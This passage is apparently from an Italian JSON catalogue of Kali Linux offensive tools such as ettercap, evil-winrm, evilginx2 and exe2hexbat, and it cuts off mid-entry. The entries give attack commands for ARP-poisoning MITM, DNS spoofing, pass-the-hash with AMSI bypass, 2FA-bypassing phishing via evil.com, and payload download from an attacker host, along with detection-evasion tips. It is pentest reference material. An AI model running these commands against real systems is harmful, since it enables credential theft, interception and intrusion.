    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EnumIAX</strong> è uno strumento specializzato per l'enumerazione di username validi su sistemi VoIP basati su Asterisk PBX che utilizzano il protocollo IAX2 (Inter-Asterisk eXchange v2). IAX2 è un protocollo proprietario di Asterisk alternativo a SIP, usato principalmente per trunk tra PBX e in ambienti dove è necessario attraversare NAT più facilmente. EnumIAX sfrutta le differenze nelle risposte del server a tentativi di registrazione per determinare quali username esistono realmente nel sistema, primo passo per successivi attacchi di password cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Username Enumeration via Response Analysis:</strong> Analizza le risposte IAX2 REGREJ per determinare se un username esiste. Asterisk può rispondere diversamente a username validi vs invalidi, permettendo di enumerare account senza conoscere le password.</p><p><strong>Dictionary Attack Mode:</strong> Testa una lista di potenziali username da un file dizionario. Supporta wordlist custom con nomi comuni, pattern aziendali (ext100, user1), o liste generate da OSINT.</p><p><strong>Sequential/Range Mode:</strong> Genera automaticamente username sequenziali numerici, ideale per enumerare estensioni telefoniche tipiche (100-199, 200-299, 1000-9999). I PBX usano spesso numeri sequenziali per le estensioni.</p><p><strong>Configurable Timing:</strong> Permette di regolare la velocità delle richieste per evitare lockout o detection, con delay configurabili tra i tentativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>EnumIAX supporta modalità dictionary e sequenziale per l'enumerazione.</p><pre><code># === DICTIONARY MODE ===\n# Enumera con file dizionario\nenumIAX -d wordlist.txt -h pbx.target.com\n\n# Con porta custom (default 4569)\nenumIAX -d users.txt -h pbx.target.com -p 4569\n\n# === SEQUENTIAL MODE ===\n# Range di estensioni tipiche\nenumIAX -m 100 -M 199 -h pbx.target.com\n\n# Range più ampio\nenumIAX -m 1000 -M 9999 -h pbx.target.com\n\n# === OUTPUT OPTIONS ===\n# Verbose mode per debug\nenumIAX -v -d users.txt -h target\n\n# === WORKFLOW TIPICO ===\n# 1. Crea wordlist con pattern comuni\necho -e \"admin\\nuser\\ntest\\nguest\\noperator\" > users.txt\nfor i in $(seq 100 199); do echo $i >> users.txt; done\n\n# 2. Enumera\nenumIAX -d users.txt -h pbx.target.com > valid_users.txt\n\n# 3. Usa gli username per password attack\n# svcrack -u valid_users.txt -h pbx.target.com</code></pre><p>Gli username trovati possono essere usati per attacchi di password spraying o brute force.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VoIP Penetration Testing</strong>, l'enumerazione username è il primo step nell'assessment di infrastrutture Asterisk. Identificare account validi permette di procedere con password attack mirati invece di blind bruteforce.</p><p>Nel <strong>Toll Fraud Assessment</strong>, verificare la sicurezza degli account VoIP è critico. Account compromessi vengono usati per toll fraud (chiamate internazionali a carico della vittima) con danni economici significativi.</p><p>Durante <strong>Red Team Operations</strong>, i sistemi VoIP spesso hanno credenziali deboli e sono meno monitorati rispetto ad altri asset IT. Compromettere il PBX può fornire accesso a registrazioni chiamate e capacità di intercettazione.</p><p>Per <strong>Security Auditing</strong>, testare se il PBX rivela informazioni sulla validità degli username aiuta a identificare misconfiguration che facilitano gli attacchi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> I sistemi Asterisk loggano i tentativi di registrazione. Enumerazione aggressiva genererà molte entry nei log e potrebbe trigggerare alert se il PBX è monitorato da SIEM.</p><p><strong>Account Lockout:</strong> Alcuni PBX implementano lockout dopo tentativi falliti. Usare delay appropriati e limitare il rate di richieste per evitare di bloccare account legittimi o farsi bannare.</p><p><strong>Protocollo Legacy:</strong> IAX2 è meno comune di SIP negli ambienti moderni. La sua presenza indica spesso sistemi legacy o specifiche configurazioni Asterisk-to-Asterisk che potrebbero avere altre vulnerabilità.</p><p><strong>Network Visibility:</strong> Il traffico IAX2 (UDP 4569) è facilmente identificabile. Firewall e IDS possono rilevare pattern di enumeration.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "VoIP"
    ],
    "notes": null
  },
  {
    "id": "ettercap",
    "name": "ettercap",
    "version": "0.8.3.1",
    "icon": "../app/icons/ettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ettercap/",
    "desc": "Suite MITM: ARP poisoning, DNS spoof, traffic injection, password sniffing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ettercap</strong> è una suite completa per attacchi man-in-the-middle su LAN. Supporta ARP poisoning, DNS spoofing, sniffing attivo e passivo di password, injection di dati nel traffico e plugin estensibili. Disponibile in versione testuale e grafica, è uno dei tool MITM più completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ARP Poisoning:</strong> MITM automatico tra host e gateway.</p><p><strong>DNS Spoofing:</strong> Redirect traffico verso server fake.</p><p><strong>Password Sniffing:</strong> Cattura credenziali da HTTP, FTP, Telnet, etc.</p><p><strong>Content Filtering:</strong> Modifica traffico on-the-fly con filtri custom.</p><p><strong>Plugin System:</strong> Estensibile con plugin per attacchi specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># MITM full duplex tra target e gateway\nsudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24// -w capture.pcap\n\n# DNS spoof con etter.dns configurato\necho \"*.microsoft.com A 10.0.0.5\" &gt;&gt; /etc/ettercap/etter.dns\nsudo ettercap -T -M arp -P dns_spoof /gateway// /target//\n\n# Injection HTML con filtro custom\n# Crea filtro: if (ip.proto == TCP &amp;&amp; tcp.dst == 80) { replace(\"</head>\", \"<script>...</script></head>\"); }\netterfilter inject.filter -o inject.ef\nsudo ettercap -T -M arp -F inject.ef /gateway// /target//\n\n# Sniffing credenziali con output\nsudo ettercap -T -M arp /gateway// /subnet// -L logfile\n\n# Plugin attivi durante MITM\nsudo ettercap -T -M arp -P autoadd,repoison_arp /gateway// /targets//\n\n# Bridge sniffing (due interfacce)\nsudo ettercap -T -o -i eth0 -B eth1\n\n# Quiet mode per logging solo credenziali\nsudo ettercap -T -q -M arp /192.168.1.1// /192.168.1.0/24//</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pentesting</strong>, tool standard per MITM su LAN.</p><p>Nel <strong>Credential Harvesting</strong>, cattura password in transito.</p><p><strong>Security Awareness</strong> per dimostrare rischi di reti non segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ARP poisoning rilevabile da IDS e strumenti come arpwatch. Può causare instabilità di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "evil-ssdp",
    "name": "evil-ssdp",
    "version": "0.8~beta",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-ssdp/",
    "desc": "Crea device UPnP fake per phishing di credenziali in rete locale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evil-SSDP</strong> è uno strumento di social engineering che sfrutta il protocollo <strong>SSDP (Simple Service Discovery Protocol)</strong> per creare dispositivi UPnP fake sulla rete locale. Questi dispositivi appaiono nell'Esplora Risorse di Windows (sezione \"Network\") come stampanti, scanner, NAS o media server legittimi. Quando un utente curioso clicca sul dispositivo fake, viene reindirizzato a una pagina di phishing ospitata localmente che imita una pagina di login (Office 365, portale aziendale, etc.) per catturare le credenziali. L'attacco sfrutta due fattori: la fiducia implicita degli utenti verso i dispositivi che appaiono nella rete aziendale e il fatto che SSDP/UPnP è abilitato di default su Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fake Device Emulation:</strong> Emula diversi tipi di dispositivi UPnP: scanner di rete, NAS (Synology, QNAP), media server, stampanti di rete. Ogni template include icona, nome e descrizione del dispositivo personalizzabili per massimizzare la credibilità nella rete target.</p><p><strong>Phishing Templates:</strong> Include template di pagine di login per Office 365, portali aziendali generici e pagine di autenticazione personalizzabili. Le credenziali inserite vengono catturate e loggate in tempo reale sulla console dell'attaccante.</p><p><strong>SSDP Protocol Handling:</strong> Risponde ai pacchetti SSDP M-SEARCH broadcast inviati dai client Windows durante la discovery dei dispositivi di rete. Il dispositivo fake appare automaticamente entro pochi secondi dall'avvio dello strumento, senza necessità di interazione.</p><p><strong>XML Description Server:</strong> Ospita i file XML di descrizione UPnP su un web server locale, fornendo tutte le informazioni necessarie affinché Windows riconosca e visualizzi correttamente il dispositivo fake con icona e nome appropriati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire dalla rete locale target specificando l'interfaccia di rete e il template desiderato.</p><pre><code># Emulare uno scanner di rete\npython3 evil-ssdp.py -i eth0 --template scanner\n\n# Emulare un NAS con nome personalizzato\npython3 evil-ssdp.py -i eth0 --template nas -n \"FileSrv-Backup\"\n\n# Template Office 365 per cattura credenziali Microsoft\npython3 evil-ssdp.py -i eth0 --template office365 -n \"Company Portal\"\n\n# Specificare porta per il web server di phishing\npython3 evil-ssdp.py -i eth0 --template scanner -p 8888\n\n# Usare template personalizzato\npython3 evil-ssdp.py -i eth0 --template /path/to/custom/ -n \"HR Portal\"</code></pre><p>Quando un utente nella LAN apre \"Network\" in Esplora Risorse, vedrà il dispositivo fake. Cliccandoci, il browser si apre sulla pagina di phishing. Le credenziali inserite appaiono nella console dell'attaccante.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Team - Internal Phishing:</strong> Vettore di phishing alternativo che non richiede email. Utile quando le difese email sono robuste (sandbox, filtri anti-phishing) ma la rete interna non è segmentata. Il dispositivo fake nella sezione Network di Windows attira naturalmente la curiosità degli utenti.</p><p><strong>Security Awareness:</strong> Dimostrare concretamente i rischi del protocollo UPnP abilitato di default. Mostra come un dispositivo apparentemente innocuo nella rete possa essere un vettore di attacco per il furto di credenziali.</p><p><strong>Physical Access Assessment:</strong> Durante un test con accesso fisico all'edificio, collegare un dispositivo alla rete e lanciare evil-ssdp per catturare credenziali passive senza generare traffico email sospetto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Visibilità:</strong> Il dispositivo fake è visibile a <strong>tutti</strong> gli utenti della rete, non solo al target. Qualsiasi utente IT-savvy potrebbe notare un dispositivo sconosciuto e segnalarlo. In reti con pochi dispositivi, un nuovo device è molto visibile.</p><p><strong>Scope LAN:</strong> SSDP opera solo nella rete locale (broadcast/multicast). Non funziona attraverso VLAN diverse a meno che non sia configurato un SSDP proxy o il routing multicast.</p><p><strong>Rilevamento:</strong> Il traffico SSDP anomalo (molte risposte da un singolo IP) può essere rilevato da IDS/IPS di rete. La pagina di phishing servita su un IP interno non standard è anch'essa un indicatore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "evil-winrm",
    "name": "evil-winrm",
    "version": "3.7",
    "icon": "../app/icons/evil-winrm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-winrm/",
    "desc": "Shell WinRM per pentest Windows con upload, download, Pass-the-Hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evil-WinRM</strong> è una shell WinRM (Windows Remote Management) progettata per penetration testing. Fornisce una shell PowerShell interattiva con funzionalità avanzate: upload/download file, caricamento script PS1, pass-the-hash, supporto proxy e molto altro. Tool essenziale per post-exploitation Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive Shell:</strong> Shell PowerShell completa via WinRM.</p><p><strong>Pass-the-Hash:</strong> Autenticazione con NTLM hash senza password.</p><p><strong>File Transfer:</strong> Upload/download file integrati.</p><p><strong>Script Loading:</strong> Carica script PS1 in memoria.</p><p><strong>Docker Support:</strong> Container pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pass-the-Hash con script e binary directories\nevil-winrm -i target -u admin -H 'aad3b435:ntlmhash' -s /opt/scripts/ -e /opt/binaries/\n\n# Kerberos auth con ticket\nexport KRB5CCNAME=/tmp/admin.ccache\nevil-winrm -i dc01.domain.local -r DOMAIN.LOCAL\n\n# SSL e porta custom\nevil-winrm -i target -u admin -p pass -S -P 5986\n\n# In-session commands avanzati:\nPS&gt; menu              # mostra tutti i comandi\nPS&gt; upload /tmp/SharpHound.exe C:\\Windows\\Temp\\\nPS&gt; download C:\\Windows\\Temp\\bloodhound.zip /tmp/\nPS&gt; Invoke-Binary /opt/Rubeus.exe hash /password:pass\nPS&gt; services           # lista servizi\nPS&gt; Dll-Loader -http http://10.10.10.5/inject.dll\n\n# Load PowerShell script in memory\nPS&gt; Bypass-4MSI        # AMSI bypass\nPS&gt; Import-Module /scripts/PowerView.ps1\nPS&gt; Get-DomainUser -Identity admin\n\n# Proxychains per pivoting\nproxychains evil-winrm -i 10.0.0.5 -u admin -H hash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, shell preferita per Windows dopo initial access.</p><p>Nel <strong>Lateral Movement</strong>, usa PTH per muoversi tra host.</p><p><strong>AD Pentesting</strong> per interazione con DC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> WinRM logging abilitato di default. PowerShell logging cattura comandi. Considera AMSI bypass per evasion.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "evilginx2",
    "name": "evilginx2",
    "version": "3.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evilginx2/",
    "desc": "MITM phishing framework che bypassa 2FA catturando session token.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evilginx2</strong> è un framework di phishing man-in-the-middle che agisce come proxy tra vittima e sito legittimo. Cattura credenziali E session token, bypassando efficacemente la 2FA. La vittima interagisce con il sito reale attraverso il proxy, rendendo l'attacco quasi indistinguibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Session Hijacking:</strong> Cattura cookie di sessione post-2FA.</p><p><strong>Transparent Proxy:</strong> Proxy inverso verso il sito reale.</p><p><strong>Phishlet Templates:</strong> Template per O365, Google, LinkedIn, etc.</p><p><strong>SSL Certificates:</strong> Genera certificati Let's Encrypt automaticamente.</p><p><strong>URL Masking:</strong> Crea URL convincenti per le vittime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup completo O365 phishing\nevilginx2 -p /opt/evilginx2/phishlets\n\n: config domain evil.com\n: config ipv4 external 1.2.3.4\n: config ipv4 bind 0.0.0.0\n\n# Configura phishlet O365\n: phishlets hostname o365 login.evil.com\n: phishlets enable o365\n\n# Crea lure con redirect\n: lures create o365\n: lures edit 0 redirect_url https://office.com\n: lures edit 0 info \"IT Security Training\"\n: lures get-url 0\n\n# Blacklist bots e scanner\n: blacklist add ip 1.2.3.4\n: blacklist add useragent *bot*\n\n# Monitoraggio sessioni catturate\n: sessions         # lista tutte\n: sessions 1       # dettaglio sessione\n\n# Export cookie per uso in browser\n: sessions 1\n# Copia cookie JSON -&gt; Cookie-Editor extension\n\n# Phishlets custom per target\nvim /opt/evilginx2/phishlets/custom.yaml\n# Definisci proxy_hosts, sub_filters, auth_tokens</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, simula attacchi phishing avanzati.</p><p>Nel <strong>2FA Testing</strong>, dimostra limitazioni di 2FA tradizionale.</p><p><strong>Awareness</strong> per training su phishing sofisticato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> URL sospetto visibile. FIDO2/WebAuthn resistono a questo attacco. Richiede dominio e infrastruttura dedicata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "exe2hexbat",
    "name": "exe2hexbat",
    "version": "1.5.1",
    "icon": "../app/icons/exe2hexbat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exe2hexbat/",
    "desc": "Converte EXE in script batch hex-encoded per trasferimento senza binary.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>exe2hexbat</strong> è uno strumento che converte file eseguibili Windows (EXE, DLL) in script <strong>batch (.bat)</strong> auto-ricostruenti. Lo script generato contiene il binario originale codificato in formato esadecimale come serie di comandi <code>echo</code>, e utilizza <code>certutil -decode</code> (un tool nativo di Windows) per riassemblare il file originale sul sistema target. Questo è fondamentale in scenari di penetration testing dove si dispone di una shell interattiva (cmd.exe) ma non si ha la possibilità di trasferire file binari tramite metodi tradizionali (HTTP, SMB, FTP) a causa di restrizioni di rete, firewall o policy di sicurezza. La tecnica rientra nel paradigma <strong>Living off the Land (LOL)</strong>, sfruttando esclusivamente tool già presenti nel sistema operativo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hex Encoding:</strong> Converte qualsiasi file binario in una rappresentazione esadecimale sotto forma di stringhe, inserite in comandi <code>echo</code> nativi di Windows. Il risultato è un file di testo ASCII puro che può essere copiato tramite clipboard o digitato carattere per carattere.</p><p><strong>Batch Script Generation:</strong> Genera uno script .bat completo che, quando eseguito sul target, ricostruisce automaticamente il file binario originale senza intervento manuale. Lo script include la fase di scrittura hex, decodifica e pulizia dei file temporanei.</p><p><strong>Certutil Decode:</strong> Utilizza <code>certutil -decode</code> per convertire il file hex/base64 nel binario originale. Certutil è un tool di gestione certificati presente in ogni installazione Windows, quindi non richiede software aggiuntivo.</p><p><strong>Chunk Splitting:</strong> Divide il file in blocchi per rispettare i limiti di lunghezza delle righe di comando di Windows (8191 caratteri in cmd.exe). I blocchi vengono concatenati automaticamente per ricostruire il file completo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Convertire il binario sulla macchina dell'attaccante, poi trasferire lo script batch sul target.</p><pre><code># Convertire un eseguibile in script batch\nexe2hexbat payload.exe output.bat\n\n# Specificare il nome del file ricostruito sul target\nexe2hexbat -o agent.exe payload.exe script.bat\n\n# Sul target Windows: eseguire lo script batch\nC:\\Temp&gt; script.bat\n# [*] Ricostruzione in corso...\n# [+] File ricostruito: agent.exe\n\n# Alternativa: copia-incolla in una shell interattiva\n# Copiare il contenuto del .bat e incollarlo nella shell cmd</code></pre><p>Il file ricostruito è identico bit-per-bit all'originale. Verificare con un hash MD5/SHA256 per confermare l'integrità.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Restricted File Transfer:</strong> Quando il firewall blocca tutto il traffico in uscita tranne la shell reverse/bind, exe2hexbat permette di trasferire tool sul target copiando testo nella shell interattiva.</p><p><strong>Air-Gapped Networks:</strong> In reti isolate dove l'unico vettore è una shell cmd, lo script batch può essere trasferito tramite clipboard (RDP, VNC) o dettato carattere per carattere.</p><p><strong>Living off the Land:</strong> L'intera catena usa solo comandi nativi Windows (echo, certutil), senza richiedere PowerShell, Python o altri interpreti che potrebbero essere disabilitati o monitorati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento certutil:</strong> Il pattern <code>certutil -decode</code> è ampiamente monitorato da EDR e SIEM come tecnica di evasione nota (MITRE ATT&CK T1140). Microsoft Defender for Endpoint genera alert specifici per questo uso di certutil.</p><p><strong>Script batch sospetti:</strong> Script .bat molto lunghi (centinaia di righe di echo) sono anomali e possono attirare l'attenzione durante la review dei log di esecuzione processi.</p><p><strong>Alternative:</strong> Per evasione migliore, considerare PowerShell IEX con download in memoria, <code>bitsadmin</code>, o <code>curl</code>/<code>wget</code> (disponibili su Windows 10+). Certutil è comunque il metodo più universale su versioni Windows legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "exiflooter",
    "name": "exiflooter",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exiflooter/",
    "desc": "Estrae metadati EXIF da immagini trovate online per geolocalizzazione e info sensibili sul target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExifLooter</strong> è uno strumento OSINT che automatizza la ricerca e l'analisi di <strong>metadati EXIF</strong> (Exchangeable Image File Format) dalle immagini pubblicate su siti web target. I metadati EXIF sono informazioni incorporate nelle immagini JPEG e TIFF dalle fotocamere digitali e dagli smartphone al momento dello scatto: coordinate GPS, modello del dispositivo, data e ora, impostazioni della fotocamera, software di editing e talvolta anche il nome del proprietario del dispositivo. ExifLooter esegue il crawling di un sito web, scarica tutte le immagini trovate, estrae i metadati e li presenta in formato leggibile o JSON. Queste informazioni possono rivelare la posizione fisica di un target, i dispositivi che utilizza e le sue abitudini.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling Automatico:</strong> Naviga ricorsivamente un sito web target seguendo i link interni, scaricando tutte le immagini JPEG, TIFF e PNG trovate. La profondità di crawling è configurabile per bilanciare copertura e velocità.</p><p><strong>GPS Extraction:</strong> Estrae le coordinate GPS incorporate nelle foto (latitudine, longitudine, altitudine) e le converte in formato leggibile. Fornisce anche link diretti a Google Maps per visualizzare la posizione sulla mappa. Le coordinate GPS rivelano dove è stata scattata la foto.</p><p><strong>Device Fingerprinting:</strong> Identifica il modello esatto della fotocamera o dello smartphone usato (es. \"iPhone 14 Pro\", \"Canon EOS R5\"), la versione del firmware, il software di editing usato successivamente (Photoshop, Lightroom) e il sistema operativo del dispositivo.</p><p><strong>Timestamp Analysis:</strong> Recupera la data e l'ora esatte dello scatto (DateTimeOriginal), la data di modifica e la data di digitalizzazione. Questi timestamp possono rivelare le abitudini temporali del target e la timeline delle attività.</p><p><strong>Batch Processing:</strong> Può analizzare anche immagini locali in batch, non solo quelle scaricate dal web, permettendo l'analisi di raccolte di immagini già disponibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare ExifLooter specificando l'URL del sito target.</p><pre><code># Analizzare tutte le immagini di un sito\nexiflooter -u https://target.com\n\n# Crawling ricorsivo con profondità 3\nexiflooter -u https://target.com -r -d 3\n\n# Output in formato JSON per analisi automatizzata\nexiflooter -u https://target.com -o results.json\n\n# Analizzare una singola immagine\nexiflooter -i /path/to/image.jpg\n\n# Filtrare solo immagini con dati GPS\nexiflooter -u https://target.com --gps-only</code></pre><p>L'output mostra per ogni immagine: URL sorgente, coordinate GPS (con link Maps), modello dispositivo, timestamp e tutti gli altri metadati EXIF disponibili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT - Geolocalizzazione:</strong> Individuare la posizione fisica di un target dalle foto pubblicate sul suo sito web personale, blog o portfolio fotografico. Foto di viaggi, uffici o abitazioni possono rivelare indirizzi precisi.</p><p><strong>Target Profiling:</strong> Identificare i dispositivi usati dal target (smartphone, fotocamera) e il software installato. Queste informazioni possono guidare la scelta dei vettori di attacco (exploit specifici per quel dispositivo/OS).</p><p><strong>Privacy Assessment:</strong> Verificare per conto di un'organizzazione se il proprio sito web espone metadati sensibili nelle immagini pubblicate, raccomandando lo stripping dei dati EXIF prima della pubblicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione passiva:</strong> ExifLooter esegue solo richieste HTTP GET standard per scaricare immagini, indistinguibili dal normale traffico di navigazione. Non modifica nulla sul target.</p><p><strong>Limitazioni:</strong> I social media principali (Facebook, Instagram, Twitter) rimuovono automaticamente i dati EXIF dalle immagini caricate. Il tool è più efficace su siti personali, blog, portfolio e siti aziendali che non implementano lo stripping automatico dei metadati.</p><p><strong>Traffico di rete:</strong> Il crawling ricorsivo di un sito genera molte richieste HTTP. In reti monitorate, il volume di download di immagini potrebbe essere rilevato. Usare delay tra le richieste per ridurre la visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Metadata"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-bin-sploits",
    "name": "exploitdb-bin-sploits",
    "version": "20221122",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-bin-sploits/",
    "desc": "Archivio di exploit binari precompilati pronti all'uso da Exploit-DB per test rapidi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>exploitdb-bin-sploits</strong> è un archivio offline di exploit binari precompilati estratti dal database <strong>Exploit-DB</strong> (exploit-db.com), il più grande repository pubblico di exploit e PoC al mondo. Mentre il pacchetto <code>exploitdb</code> contiene gli exploit in forma di codice sorgente (C, Python, Ruby, etc.), questo pacchetto fornisce i binari già compilati e pronti all'uso per diverse piattaforme (Windows, Linux, macOS). L'archivio è particolarmente utile in situazioni dove non si ha un compilatore disponibile o quando si necessita di un exploit funzionante immediatamente senza dover risolvere dipendenze di compilazione. Su Kali Linux, i binari sono installati in <code>/usr/share/exploitdb-bin-sploits/</code>.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Binari Precompilati:</strong> Exploit già compilati per architetture x86, x86_64 e ARM. Include exploit per privilege escalation locale, buffer overflow, kernel exploit e PoC di vulnerabilità note. Evita problemi di compilazione (dipendenze mancanti, versioni incompatibili di librerie).</p><p><strong>Indicizzazione per EDB-ID:</strong> Ogni binario è identificato dal suo Exploit-DB ID (EDB-ID), lo stesso numero usato su exploit-db.com. Questo permette di incrociare facilmente il binario con la documentazione, il CVE associato e il codice sorgente originale.</p><p><strong>Multi-Platform:</strong> Include exploit per Windows (PE), Linux (ELF) e altri sistemi operativi. Copre kernel exploit, exploit per servizi specifici e tool di privilege escalation.</p><p><strong>Integrazione con searchsploit:</strong> Il tool <code>searchsploit</code> (incluso nel pacchetto <code>exploitdb</code>) può cercare anche nei bin-sploits, permettendo di trovare sia il codice sorgente che il binario precompilato per una vulnerabilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I binari sono già disponibili nel filesystem dopo l'installazione. Usare <code>searchsploit</code> per trovare exploit rilevanti.</p><pre><code># Cercare exploit con searchsploit\nsearchsploit linux kernel 4.4 privilege escalation\n\n# Listare i binari disponibili\nls /usr/share/exploitdb-bin-sploits/bin-sploits/\n\n# Cercare un exploit specifico per EDB-ID\nls /usr/share/exploitdb-bin-sploits/bin-sploits/ | grep 40839\n\n# Copiare l'exploit per l'uso\ncp /usr/share/exploitdb-bin-sploits/bin-sploits/40839.zip /tmp/\n\n# Trasferire sul target (es. via Python HTTP server)\npython3 -m http.server 8080\n# Sul target: wget http://attacker:8080/40839 -O exploit</code></pre><p>Prima di usare un exploit binario, verificare sempre la documentazione su exploit-db.com per comprendere i prerequisiti, la versione vulnerabile e le istruzioni d'uso.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Quick Lab Testing:</strong> In ambienti lab (HackTheBox, TryHackMe, OSCP), avere exploit precompilati permette di testare rapidamente vulnerabilità senza perdere tempo nella compilazione. Particolarmente utile per kernel exploit Linux che spesso richiedono header specifici per la compilazione.</p><p><strong>Offline Assessment:</strong> In reti air-gapped o senza accesso internet, l'archivio locale di exploit precompilati è una risorsa fondamentale. Non è necessario scaricare nulla durante l'engagement.</p><p><strong>Reference Collection:</strong> Utile come collezione di riferimento per studiare exploit noti e comprendere le tecniche di exploitation per diverse vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature AV:</strong> I binari pubblici di Exploit-DB hanno firme note presso tutti i principali antivirus ed EDR. Non devono essere usati in engagement reali senza modifica, offuscamento o ricompilazione da sorgente con modifiche.</p><p><strong>Affidabilità:</strong> Non tutti i binari precompilati sono affidabili o funzionanti. Alcuni potrebbero essere stati compilati per versioni specifiche o con opzioni particolari. Preferire sempre la compilazione dal sorgente quando possibile.</p><p><strong>Sicurezza:</strong> Trattandosi di exploit binari da terze parti, eseguirli sempre in un ambiente isolato (VM) per primi, verificando che facciano effettivamente quello che dichiarano.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-papers",
    "name": "exploitdb-papers",
    "version": "20221122",
    "icon": "../app/icons/exploitdb-papers-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-papers/",
    "desc": "Collezione di whitepaper e documentazione tecnica su vulnerabilità e tecniche di exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>exploitdb-papers</strong> è una collezione offline di <strong>whitepaper, articoli tecnici e documentazione di ricerca</strong> sulla sicurezza informatica, estratta dal database Exploit-DB. Mentre il pacchetto <code>exploitdb</code> contiene exploit e PoC eseguibili, questo pacchetto contiene la documentazione teorica e le ricerche che accompagnano quegli exploit. Include paper su vulnerabilità specifiche, write-up dettagliati di exploit, guide su tecniche offensive e difensive, analisi di malware e ricerche accademiche sulla sicurezza. Su Kali Linux, i paper sono installati in <code>/usr/share/exploitdb-papers/</code> e sono ricercabili tramite <code>searchsploit</code>. È una risorsa fondamentale per comprendere il contesto tecnico dietro le vulnerabilità prima di tentare l'exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vulnerability Research:</strong> Contiene paper dettagliati che spiegano le cause tecniche delle vulnerabilità: come sono state scoperte, quale codice è vulnerabile, quali condizioni sono necessarie per l'exploitation e come funziona il fix. Molto più utile del semplice PoC per 